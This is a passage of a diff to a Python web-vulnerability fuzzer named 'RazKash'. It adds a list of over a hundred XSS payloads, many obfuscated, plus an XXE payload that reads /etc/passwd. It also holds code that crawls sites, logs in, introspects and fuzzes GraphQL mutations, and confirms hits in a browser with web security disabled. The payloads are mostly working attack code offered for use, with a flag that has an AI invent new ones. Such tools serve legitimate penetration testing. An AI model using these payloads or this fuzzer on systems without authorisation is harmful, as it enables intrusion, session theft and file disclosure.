+    # 41–50: SVG / XML / MathML
+    '<svg onload=alert("XSS")></svg>',
+    '<svg><script>alert("XSS")</script></svg>',
+    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
+    "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
+    "<svg><p><style><img src=x onerror=alert(\"XSS\")></p></svg>",
+    '<math><mtext></mtext><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
+    "<?xml version=\"1.0\"?><root><![CDATA[<script>alert('XSS')</script>]]></root>",
+    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    "<svg><a xlink:href=\"javascript:alert('XSS')\">CLICK</a></svg>",
+    "\"><svg/onload=confirm('XSS')>",
+
+    # 51–60: CSS, Meta
+    '<style>*{background:url("javascript:alert(\'XSS\')");}</style>',
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
+    "<style>li {list-style-image: url(\"javascript:alert('XSS')\");}</style><ul><li>Test",
+    "<div style=\"width: expression(alert('XSS'))\">",
+    '<style>body:after { content:"XSS"; }</style>',
+    "<style onload=alert(\"XSS\")></style>",
+    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
+    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
+    "<style>@keyframes xss { from {color: red;} to {color: green;} } div { animation: xss 5s infinite; }</style>",
+    "<meta charset=\"x-unknown\" content=\"javascript:alert('XSS')\">",
+
+    # 61–70: Event Handlers & Rare Tags
+    "<img src=x onmouseover=alert('XSS')>",
+    "<marquee onstart=alert('XSS')>Scrolling Text</marquee>",
+    "<table background=\"javascript:alert('XSS')\"><tr><td>XSS!</td></tr></table>",
+    "<audio src onerror=alert('XSS')></audio>",
+    "<video src onerror=confirm('XSS')></video>",
+    "<object data=\"javascript:alert('XSS')\"></object>",
+    "<embed src=\"javascript:alert('XSS')\"></embed>",
+    "<applet code=javascript:alert('XSS')></applet>",
+    "<details ontoggle=alert('XSS')>Click to toggle</details>",
+    "<textarea autofocus onfocus=alert(\"XSS\")>Focus me</textarea>",
+
+    # 71–80: Attribute Escapes
+    "\" autofocus onfocus=alert('XSS') foo=\"",
+    "' onmouseover=alert(\"XSS\") '",
+    "<!--\"><script>alert('XSS')</script>",
+    "-->\"><script>alert('XSS')</script>",
+    "<!--#exec cmd=\"/bin/echo '<script>alert(XSS)</script>'\"-->",
+    "<title onpropertychange=alert('XSS')>TitleXSS</title>",
+    "<blink onclick=alert(\"XSS\")>Blink me</blink>",
+    "\"--><script>alert('XSS')</script><!--\"",
+    "'-->\"><img src=x onerror=alert(\"XSS\")>",
+    "--><svg/onload=alert('XSS')><!",
+
+    # 81–90: javascript: / data URIs
+    "javascript:alert(\"XSS\")",
+    "JaVaScRiPt:alert(\"XSS\")",
+    "data:text/html,<script>alert(\"XSS\")</script>",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "\"><iframe srcdoc=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
+    "\"><script>window.location='javascript:alert(\"XSS\")'</script>",
+    "<a href=\"data:text/html;charset=utf-8,<script>alert(1)</script>\">Data Link</a>",
+    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
+    "\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
+    "<video src=\"data:video/mp4;base64,invalid\" onerror=\"alert('XSS')\"></video>",
+
+    # 91–100: Obfuscated
+    "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "\"><script>alert(unescape('%58%53%53'))</script>",
+    "<script>eval(\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;\")</script>",
+    "<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>",
+    "<iframe srcdoc=\"%3Cscript%3Ealert('XSS')%3C%2Fscript%3E\"></iframe>",
+    "\"><img src=x oneRrOr=eval('al'+'ert(1)')>",
+    "<img src=x onerror=\"this['al'+'ert']('XSS')\">",
+    "<svg onload='fetch(\"data:,\"+String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",
+    "<style>*{background-image:url(\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\")} </style>",
+    "<img src=1 onerror='eval(decodeURIComponent(\"%61%6c%65%72%74%28%31%29\"))'>"
+]
+    
+BASE_PAYLOADS = [
+    '<script>alert("XSS")</script>',
+    '<img src="x" onerror="alert(\'XSS\')" />',
+    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
+    '"><script>alert("XSS")</script>',
+    '"><img src=x onerror=alert("XSS")>',
+    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
+    'javascript:alert("XSS")',
+    'javascript:confirm("XSS")',
+    'javascript:eval("alert(\'XSS\')")',
+    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
+    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
+    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
+    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
+    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
+    '<img src=x onerror=confirm("XSS")>',
+    '<img src=x onerror=eval("alert(\'XSS\')")>',
+    '\'; alert(String.fromCharCode(88,83,83))//',
+    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
+    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
+    '<img foo=a src="javascript:alert(\'XSS\')">',
+    '<img foo=a onerror="alert(\'XSS\')">',
+    '<img src="http://example.com/image.jpg">',
+    '<img src="">',
+    '<img>',
+    '<img src=x onerror=alert("XSS")>',
+    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
+    '&#34;><img src=x onerror=alert(\'XSS\')>',
+    '&#34><img src=x onerror=alert(\'XSS\')>',
+    '&#x22><img src=x onerror=alert(\'XSS\')>',
+    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
+    '<img src="vbscript:alert(\'XSS\')">',
+    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
+    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
+    '<BODY ONLOAD=alert(\'XSS\')>',
+    '<img onmouseover="alert(\'XSS\')" src="x">',
+    '<s<Sc<script>ript>alert(\'XSS\')</script>',
+    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
+    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
+    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
+    '<BASE HREF="javascript:alert(\'XSS\');//">',
+    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
+    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
+    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
+    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
+    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+]
+if args.invent:
+    # Let the AI fill in 'MASK'
+    BASE_PAYLOADS.append('MASK')
+
+PAYLOADS = BASE_PAYLOADS.copy()
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                        ERROR DETECTION / PATTERNS
+# ─────────────────────────────────────────────────────────────────────────────
+
+SQL_ERROR_RE = re.compile(r"(SQL syntax|MySQL|syntax error|unclosed quotation|InnoDB|PostgreSQL)", re.I)
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                            VERIFICATION
+# ─────────────────────────────────────────────────────────────────────────────
+
+def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
+    """
+    Launches a headless or headed browser to detect if any script
+    event (alert, confirm, prompt, etc.) was triggered.
+    """
+    if not sync_playwright:
+        return False
     try:
-        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
-        text = r.text.lower()
-        for name, patterns in sigs.items():
-            if any(pat.lower() in text for pat in patterns):
-                return name
-    except:
-        pass
-    return "unknown"
+        with sync_playwright() as p:
+            bw = p.chromium.launch(
+                headless=not args.headed,
+                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
+            )
+            ctx = bw.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
+            page = ctx.new_page()
 
-# ─── LOGGING & HIT CAPTURE ─────────────────────────────────────────────────
+            # Inject a minimal script to detect XSS
+            page.add_init_script("""
+                window._xss_triggered = false;
+                const mark = () => { window._xss_triggered = true; };
+                ['alert','confirm','prompt'].forEach(fn => {
+                    const _orig = window[fn];
+                    window[fn] = (...args) => { mark(); return _orig(...args); };
+                });
+                document.addEventListener('securitypolicyviolation', mark);
+            """)
+            page.on("dialog", lambda d: (d.dismiss(), page.evaluate("window._xss_triggered = true")))
+
+            if method.upper() == "GET":
+                q = urllib.parse.urlencode(data)
+                page.goto(f"{url}?{q}", timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+            else:
+                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+                headers = {"Content-Type": "application/json"} if is_json else {"Content-Type": "application/x-www-form-urlencoded"}
+                body    = json.dumps(data) if is_json else urllib.parse.urlencode(data)
+                page.evaluate("(u,h,b) => fetch(u,{method:'POST',headers:h,body:b})", url, headers, body)
+
+            page.wait_for_timeout(HEADLESS_WAIT)
+            hit = page.evaluate("window._xss_triggered")
+            ctx.close()
+            bw.close()
+            return bool(hit)
+    except Exception as ex:
+        dbg(f"[verify] {ex}")
+        return False
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                            LOGGING
+# ─────────────────────────────────────────────────────────────────────────────
+
 if not LOGFILE.exists():
     LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n", "utf-8")
+
 _hits = set()
 log_lock = threading.Lock()
 
-def log_hit(url: str, method: str, payload: str, params: List[str]):
-    param_str = ", ".join(params)
-    entry = f"- **XSS** {method} `{url}` param=`{param_str}` payload=`{payload[:90]}`\n"
+def log_hit(url, method, payload, params=None):
+    params = params or []
+    entry = f"- **XSS** {method} `{url}` param={params} payload=`{payload}`\n"
     with log_lock:
         if entry in _hits:
             return
@@ -451,144 +457,115 @@ def log_hit(url: str, method: str, payload: str, params: List[str]):
         LOGFILE.write_text(LOGFILE.read_text("utf-8") + entry, "utf-8")
     logging.info(entry.strip())
 
+# ─────────────────────────────────────────────────────────────────────────────
+#                          SESSION / AUTH
+# ─────────────────────────────────────────────────────────────────────────────
 
-# ─── VERIFICATION ─────────────────────────────────────────────────────────
-def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
-    if not sync_playwright:
-        dbg("[verify] Playwright not available")
-        return False
+def get_authenticated_session():
+    s = requests.Session()
+    if args.login_url and args.username and args.password:
+        if args.login_url.endswith("/rest/user/login"):
+            # JSON-based login
+            h = random_headers()
+            h["Content-Type"] = "application/json"
+            try:
+                r = s.post(args.login_url, json={"email": args.username, "password": args.password},
+                           headers=h, timeout=HTTP_TIMEOUT, verify=False)
+                j = r.json()
+                token = j.get("token") or j.get("authentication",{}).get("token")
+                if token:
+                    s.headers.update({"Authorization": f"Bearer {token}"})
+            except:
+                pass
+        else:
+            # HTML form-based login
+            r0 = s.get(args.login_url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+            csrf_val = re.search(f'name="{args.csrf_field}" value="([^"]+)"', r0.text)
+            data = {}
+            if csrf_val:
+                data[args.csrf_field] = csrf_val.group(1)
+            data.update({"username": args.username, "password": args.password})
+            s.post(args.login_url, data=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+
+    s.mount("https://", HTTPAdapter(pool_connections=50, pool_maxsize=50))
+    s.mount("http://",  HTTPAdapter(pool_connections=50, pool_maxsize=50))
+    return s
+
+SESSION = get_authenticated_session()
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                          GRAPHQL HELPERS
+# ─────────────────────────────────────────────────────────────────────────────
+
+INTROSPECTION = """ query IntrospectionQuery {
+  __schema {
+    queryType { name }
+    mutationType { name }
+    types {
+      kind name
+      fields { name args { name type { kind name ofType { kind } } } }
+    }
+  }
+}
+"""
+
+def discover_graphql_ops(ep):
     try:
-        with sync_playwright() as p:
-            browser = p.chromium.launch(
-                headless=not args.headed,
-                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
-            )
-            ctx = browser.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
-            ctx.add_init_script(JSFLAG)
-            page = ctx.new_page()
-            page.on("dialog", lambda d: (
-                d.accept() if args.headed else d.dismiss(),
-                page.evaluate("_f()")
-            ))
-            if method.upper() == "GET":
-                page.goto(f"{url}?{urllib.parse.urlencode(data)}", timeout=VERIFY_TIMEOUT, wait_until="networkidle")
-            else:
-                hdr = {"Content-Type":"application/json"} if is_json else {"Content-Type":"application/x-www-form-urlencoded"}
-                body = json.dumps(data) if is_json else urllib.parse.urlencode(data)
-                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
-                page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b})", url, hdr, body)
-            page.wait_for_timeout(HEADLESS_WAIT)
-            triggered = page.evaluate("window._xss_triggered")
-            if args.headed and triggered:
-                print(f"⚡ XSS popup at {url}")
-                page.wait_for_timeout(30_000)
-            ctx.close()
-            browser.close()
-            return bool(triggered)
-    except Exception as e:
-        dbg(f"[verify] {e}")
-        return False
+        j = SESSION.post(ep, json={"query": INTROSPECTION}, timeout=HTTP_TIMEOUT, verify=False).json()
+        schema = j["data"]["__schema"]
+        ops = []
+        for kind in ("queryType","mutationType"):
+            root = schema.get(kind)
+            if not root:
+                continue
+            for t in schema["types"]:
+                if t["name"] == root["name"]:
+                    for f in t["fields"]:
+                        # string args
+                        arg_names = [a["name"] for a in f["args"] if a["type"]["name"] == "String"]
+                        if arg_names:
+                            ops.append((f["name"], arg_names))
+        return ops
+    except:
+        return []
 
-# ─── SEMANTIC INJECTION DISCOVERY ──────────────────────────────────────────
-def deep_keys(o: Any, prefix: str="") -> List[str]:
-    keys = []
-    if isinstance(o, dict):
-        for k, v in o.items():
-            p = f"{prefix}.{k}" if prefix else k
-            if isinstance(v, (dict, list)):
-                keys += deep_keys(v, p)
-            else:
-                keys.append(p)
-    elif isinstance(o, list):
-        for i, v in enumerate(o):
-            p = f"{prefix}[{i}]"
-            if isinstance(v, (dict, list)):
-                keys += deep_keys(v, p)
-            else:
-                keys.append(p)
-    return keys
+def fuzz_graphql(ep):
+    ops = discover_graphql_ops(ep)
+    for name, args_ in ops:
+        for a in args_:
+            payload = '<img src=x onerror=alert(1)>'
+            try:
+                SESSION.post(
+                    ep,
+                    json={"query": f"mutation{{{name}({a}:\"{payload}\"){{__typename}}}}"},
+                    timeout=HTTP_TIMEOUT,
+                    verify=False
+                )
+                # Basic attempt, not verified in a browser here
+            except Exception as ex:
+                dbg(f"[fuzz_graphql] {ex}")
 
-def set_deep(o: Any, path: str, val: Any):
-    parts = [seg for seg in re.split(r'\.|\[|\]', path) if seg]
-    cur = o
-    for seg in parts[:-1]:
-        if seg.isdigit():
-            continue
-        cur = cur.setdefault(seg, {})
-    leaf = parts[-1]
-    if not leaf.isdigit():
-        cur[leaf] = val
+# ─────────────────────────────────────────────────────────────────────────────
+#                            CRAWLING
+# ─────────────────────────────────────────────────────────────────────────────
 
-def extract_semantic_targets(html: str, base: str) -> List[Dict[str, Any]]:
-    soup = BeautifulSoup(html, "html.parser")
-    results = []
-    # JSON-LD
-    for scr in soup.find_all("script", {"type":"application/ld+json"}):
-        try:
-            j = json.loads(scr.string or "")
-            paths = deep_keys(j)
-            for p in paths:
-                results.append({"url": base, "method":"POST", "json":True, "template":j, "params":[p]})
-        except:
-            pass
-    # RDFa/Microdata
-    for tag in soup.find_all(attrs={"property":True}):
-        prop = tag.get("property")
-        if prop:
-            results.append({"url": base, "method":"GET", "params":[prop]})
-    for tag in soup.find_all(attrs={"itemprop":True}):
-        ip = tag.get("itemprop")
-        if ip:
-            results.append({"url": base, "method":"GET", "params":[ip]})
-    # AngularJS interpolation
-    for m in re.findall(r"\{\{(.+?)\}\}", html):
-        results.append({"url": base, "method":"GET", "params":[m.strip()]})
-    return results
-
-# ─── JS MINING & ASSET DISCOVERY ───────────────────────────────────────────
-import re
-
-# match JS calls like fetch('/foo.aspx?x=1'), axios.get("/bar.ashx"), XHR.open('GET','/baz.aspx')
-JS_CALL_RE = re.compile(r"""
-    (?:                                       # any of:
-        fetch\(\s*['"]                       #   fetch('...
-      | axios\.(?:get|post|put|delete|patch) #   axios.get|post|...
-        \(\s*['"]
-      | XHR\.open\(\s*['"](GET|POST)['"],\s* #   XHR.open('GET','...
-    )
-    (
-      /[^'"]+                                # path must start with slash
-      \.(?:js|php|asp|aspx|html|htm|ashx|asmx|jsp      # file extensions to catch
-         |json|api|graphql|cgi)
-      (?:\?[^'"]*)?                          # optional query string
-    )
-    ['"]                                     # closing quote
-""", re.IGNORECASE | re.VERBOSE)
-
-# match any literal URL in JS strings: "/foo.aspx", '/bar.php?x=1'
-JS_URL_RE = re.compile(r"""
-    ['"]                                    # opening quote
-    (
-      /[^'"]+                               # leading slash + path
-      \.(?:js|php|asp|aspx|html|htm|ashx|asmx|jsp     # same extensions
-         |json|api|graphql|cgi)
-      (?:\?[^'"]*)?                         # optional query string
-    )
-    ['"]                                    # closing quote
-""", re.IGNORECASE | re.VERBOSE)
-
-def mine_js(url: str, host: str) -> List[str]:
+def mine_js(url, host):
+    """Extract possible subrequests from JS content."""
     found = []
     try:
         r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
         txt = r.text
-        found += JS_CALL_RE.findall(txt)
-        found += [m for m in JS_URL_RE.findall(txt)]
-        if url.endswith(".js") and "sourceMappingURL" in txt:
-            sm = url.rsplit("/", 1)[0] + "/" + txt.split("sourceMappingURL=")[-1].split("\n")[0].strip()
-            found += mine_js(sm, host)
-    except Exception as e:
-        dbg(f"[mine_js] {e}")
+        js_call_re = re.compile(
+            r'(?:fetch\(["\']|axios\.\w+\(["\']|XHR\.open\(["\'](GET|POST)["\'],\s*)(/[^"\']+\.(?:js|php|asp|json|graphql)(?:\?[^"\']*)?)["\']',
+            re.IGNORECASE
+        )
+        js_url_re  = re.compile(r'["\'](/[^"\']+\.(?:js|php|asp|json|graphql)(?:\?[^"\']*)?)["\']', re.IGNORECASE)
+
+        found += [m[1] for m in js_call_re.findall(txt)]
+        found += js_url_re.findall(txt)
+    except:
+        pass
+
     out = set()
     for u in found:
         full = urllib.parse.urljoin(url, u)
@@ -596,322 +573,297 @@ def mine_js(url: str, host: str) -> List[str]:
             out.add(full)
     return list(out)
 
-def misc_assets(root: str) -> List[str]:
-    base = urllib.parse.urlparse(root)._replace(path="", query="", fragment="").geturl()
+def misc_assets(root):
+    """Look for additional assets like sitemap or robots."""
+    base = urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
     assets = []
+    # robots.txt
     try:
-        txt = SESSION.get(base+"/robots.txt", headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
+        txt = SESSION.get(base + "/robots.txt", headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
         for line in txt.splitlines():
             if line.lower().startswith("sitemap:"):
                 assets.append(line.split(":",1)[1].strip())
-        for sm in assets.copy():
-            with contextlib.suppress(Exception):
-                xml = SESSION.get(sm, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
-                tree = ET.fromstring(xml)
-                for loc in tree.iter("{*}loc"):
-                    assets.append(loc.text.strip())
-    except Exception as e:
-        dbg(f"[misc_assets] {e}")
-    for path in ("/manifest.json","/ngsw.json"):
-        with contextlib.suppress(Exception):
-            data = SESSION.get(base+path, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
-            j = json.loads(data)
-            for key in ("assets","files"):
-                for v in j.get(key, []):
-                    assets.append(base+v if v.startswith("/") else v)
-    return list(set(assets))
+    except:
+        pass
+    return assets
 
-# ─── STATIC CRAWLER ─────────────────────────────────────────────────────────
-def crawl_static(root: str, cap: int, depth: int = 0) -> List[Dict[str, Any]]:
+def crawl_static(root, cap, depth=0):
     visited = set()
-    queue = [(root, 0)] + [(u, 0) for u in misc_assets(root)]
-    targets = []
+    queue = [root] + misc_assets(root)
+    results = []
     host = urllib.parse.urlparse(root).netloc.lower()
-    logging.info(f"[static] crawling {root} (≤{cap} pages, depth={depth})")
+
     while queue and len(visited) < cap:
-        u, d = queue.pop(0)
+        u = queue.pop(0)
         if u in visited:
             continue
         visited.add(u)
         try:
             r = SESSION.get(u, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
-        except Exception as e:
-            dbg(f"[static] {u} err: {e}")
+        except:
             continue
-
-        c = r.headers.get("Content-Type", "")
-        if "javascript" in c:
-            for js in mine_js(u, host):
-                if js not in visited:
-                    queue.append((js, d))
+        ct = (r.headers.get("content-type") or "").lower()
+        # If JS, mine more links
+        if "javascript" in ct:
+            for jurl in mine_js(u, host):
+                if jurl not in visited:
+                    queue.append(jurl)
             continue
-        if "html" not in c:
+        # If not HTML, skip
+        if "html" not in ct:
             continue
 
         soup = BeautifulSoup(r.text, "html.parser")
-        # handle iframes
-        if args.crawl_iframes and d < args.nested_depth:
-            for iframe in soup.find_all("iframe", src=True):
-                src = urllib.parse.urljoin(u, iframe["src"])
+
+        # Iframes
+        if args.crawl_iframes and depth < args.nested_depth:
+            for ifr in soup.find_all("iframe", src=True):
+                src = urllib.parse.urljoin(u, ifr["src"])
                 if urllib.parse.urlparse(src).netloc.lower() == host:
-                    queue.append((src, d + 1))
-        # enqueue scripts
-        for tag in soup.find_all("script", src=True):
-            src = urllib.parse.urljoin(u, tag["src"])
-            if urllib.parse.urlparse(src).netloc.lower() == host:
-                queue.append((src, d))
-        # links
+                    queue.append(src)
+
+        # scripts
+        for sc in soup.find_all("script", src=True):
+            scr = urllib.parse.urljoin(u, sc["src"])
+            if urllib.parse.urlparse(scr).netloc.lower() == host:
+                queue.append(scr)
+
+        # anchors
         for a in soup.find_all("a", href=True):
-            nxt = urllib.parse.urljoin(u, a["href"])
-            p = urllib.parse.urlparse(nxt)
-            if p.netloc.lower() != host:
+            link = urllib.parse.urljoin(u, a["href"])
+            pu   = urllib.parse.urlparse(link)
+            if pu.netloc.lower() != host:
                 continue
-            if nxt not in visited:
-                queue.append((nxt, d))
-            if p.query:
-                qs = list(urllib.parse.parse_qs(p.query).keys())
-                targets.append({"url": p._replace(query="").geturl(), "method": "GET", "params": qs})
+            if link not in visited:
+                queue.append(link)
+            if pu.query:
+                qs = list(urllib.parse.parse_qs(pu.query).keys())
+                results.append({"url": pu._replace(query="").geturl(), "method": "GET", "params": qs})
+
         # forms
         for f in soup.find_all("form"):
             act = urllib.parse.urljoin(u, f.get("action") or u)
             if urllib.parse.urlparse(act).netloc.lower() != host:
                 continue
-            mth = f.get("method", "get").upper()
-            params = [i.get("name") for i in f.find_all(["input", "textarea", "select"]) if i.get("name")]
-            if params:
-                targets.append({"url": act, "method": mth, "params": params})
-        # buttons
-        for btn in soup.find_all("button"):
-            name = btn.get("name")
-            fa   = btn.get("formaction")
-            mth  = btn.get("formmethod", "post").upper()
-            url2 = urllib.parse.urljoin(u, fa) if fa else u
-            if name:
-                targets.append({"url": url2, "method": mth, "params": [name]})
-        # submit inputs
-        for inp in soup.find_all("input", {"type": "submit"}):
-            name = inp.get("name")
-            fa   = inp.get("formaction")
-            mth  = inp.get("formmethod", "post").upper()
-            url2 = urllib.parse.urljoin(u, fa) if fa else u
-            if name:
-                targets.append({"url": url2, "method": mth, "params": [name]})
-        # semantic targets
-        targets += extract_semantic_targets(r.text, u)
-        jitter(0.3, 0.9)
+            meth = f.get("method","get").upper()
+            ps = [i.get("name") for i in f.find_all(["input","textarea","select"]) if i.get("name")]
+            if ps:
+                results.append({"url": act, "method": meth, "params": ps})
 
-    logging.info(f"[static] discovered {len(targets)} endpoints")
-    return targets
+    return results
 
-
-# ─── DYNAMIC CRAWLER ───────────────────────────────────────────────────────
-# ─── DYNAMIC CRAWLER ───────────────────────────────────────────────────────
-def crawl_dynamic(root: str) -> List[Dict[str,Any]]:
+def crawl_dynamic(root):
+    """Uses Playwright to capture dynamic requests (XHR, fetch) if available."""
     if not sync_playwright:
-        logging.info("[dynamic] skipping—Playwright unavailable")
         return []
-    host = urllib.parse.urlparse(root).netloc.lower()
     found = []
-    seen = set()
-    logging.info(f"[dynamic] launching Playwright for {root}")
+    seen  = set()
+    host  = urllib.parse.urlparse(root).netloc.lower()
+
     try:
         with sync_playwright() as p:
             br = p.chromium.launch(
                 headless=not args.headed,
                 args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
             )
-            ctx = br.new_context(
-                ignore_https_errors=True,
-                user_agent=UserAgent().random,
-                service_workers="allow"
-            )
+            ctx = br.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
             page = ctx.new_page()
 
-            # intercept all network requests (XHR/fetch/etc)
-            def on_req(req: PWReq):
+            def on_req(req):
                 u = req.url
                 if urllib.parse.urlparse(u).netloc.lower() != host or u in seen:
                     return
                 seen.add(u)
-                mth = req.method.upper()
-                hdr = req.headers.get("content-type","")
-                is_json = "json" in hdr or "graph" in hdr
-                tpl, keys = None, []
-                if is_json and req.post_data:
-                    with contextlib.suppress(Exception):
-                        j = json.loads(req.post_data)
-                        tpl = j.get("variables", j) if isinstance(j, dict) else {}
-                        keys = deep_keys(tpl)
-                qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query).keys())
-                params = keys or qs or ["data"]
+                m = req.method.upper()
+                hd = req.headers.get("content-type","").lower()
+                is_json = ("json" in hd or "graph" in hd)
+                try:
+                    data = json.loads(req.post_data or "{}")
+                except:
+                    data = {}
+                qs = list(urllib.parse.urlparse(u).query.split("&")) if "?" in u else []
+                if data:
+                    param_names = list(data.keys())
+                else:
+                    param_names = [q.split("=")[0] for q in qs if q] or ["payload"]
                 found.append({
-                    "url": u.split("?",1)[0],
-                    "method": mth if mth in {"POST","PUT"} else "GET",
-                    "params": params,
-                    "json": bool(keys),
-                    "template": tpl
+                    "url": u.split("?", 1)[0],
+                    "method": m if m in ("POST","PUT") else "GET",
+                    "params": param_names,
+                    "json": is_json,
+                    "template": data
                 })
 
             page.on("request", on_req)
-            if args.crawl_iframes:
-                page.on("frameattached", lambda f: f.on("request", on_req))
-
-            # propagate existing cookies
-            for c in SESSION.cookies:
-                page.context.add_cookies([{
-                    "name": c.name, "value": c.value,
-                    "domain": c.domain, "path": c.path
-                }])
-
             page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+            time.sleep(1)
 
-            # simulate SPA navigation
-            if args.simulate_spa:
-                for a in page.query_selector_all("a[href]"):
-                    with contextlib.suppress(Exception):
-                        a.click()
-                        page.wait_for_timeout(SPA_WAIT_MS)
-
-            # click buttons and submit inputs
-            for b in page.query_selector_all("button, input[type=submit]"):
-                with contextlib.suppress(Exception):
-                    b.click()
-                    page.wait_for_timeout(SPA_WAIT_MS)
-
-            # shadow-DOM–aware form extractor
-            def dom_forms():
-                forms = page.evaluate("""
-() => {
-    const out = [];
-    function collectForms(root) {
-        root.querySelectorAll('form').forEach(f => out.push(f));
-        root.querySelectorAll('*').forEach(el => {
-            if (el.shadowRoot) collectForms(el.shadowRoot);
-        });
-    }
-    collectForms(document);
-    return out.map(f => ({
-        action: f.action || location.href,
-        method: (f.method || 'get').toUpperCase(),
-        params: Array.from(
-            f.querySelectorAll('input[name],textarea[name],select[name]')
-        ).map(i => i.name)
-    }));
-}
-                """)
-                for f in forms:
-                    a = f["action"]
-                    if urllib.parse.urlparse(a).netloc.lower() != host or not f["params"]:
-                        continue
-                    found.append({"url": a, "method": f["method"], "params": f["params"]})
-
-            # initial form harvest
-            dom_forms()
-
-            # observe for dynamically injected forms
-            start = time.time() * 1000
-            rounds = 0
-            while (time.time() * 1000 - start) < DYN_OBS_MS and rounds < MAX_DYN_ROUNDS:
-                with contextlib.suppress(Exception):
-                    page.wait_for_timeout(RESCAN_MS)
-                dom_forms()
-                rounds += 1
+            # (Optional) Could simulate more interactions here if needed
 
             ctx.close()
             br.close()
-
-    except Exception as e:
-        dbg(f"[dynamic] {e}")
-
-    logging.info(f"[dynamic] discovered {len(found)} endpoints")
+    except:
+        pass
     return found
 
+# ─────────────────────────────────────────────────────────────────────────────
+#                     FUZZING (HTTP & WEBSOCKETS)
+# ─────────────────────────────────────────────────────────────────────────────
 
-# ─── FUZZING ENGINES ───────────────────────────────────────────────────────
-def fuzz_http(t: Dict[str,Any]) -> None:
-    url    = t["url"]
-    method = t["method"]
-    is_json = t.get("json", False)
-    tpl    = t.get("template")
-    marker = randstr()
-    try:
-        if is_json and tpl:
-            body = json.loads(json.dumps(tpl))
-            set_deep(body, random.choice(t["params"]), marker)
-            resp = SESSION.post(url, headers={"Content-Type":"application/json"}, data=json.dumps(body),
-                                timeout=HTTP_TIMEOUT, verify=False)
+static_exts = {
+    "png","jpg","jpeg","gif","bmp","svg","webp","ico",
+    "css","woff","woff2","ttf","eot","otf","mp4","mp3","webm",
+    "pdf","zip","rar","7z","tar","gz"
+}
+
+def set_deep(obj, path, val):
+    """Set a deep key in a nested dict or list, e.g. foo.bar[2].baz."""
+    parts = re.split(r'\.|(\[\d+\])', path)
+    parts = [p for p in parts if p and p.strip()]
+    cur = obj
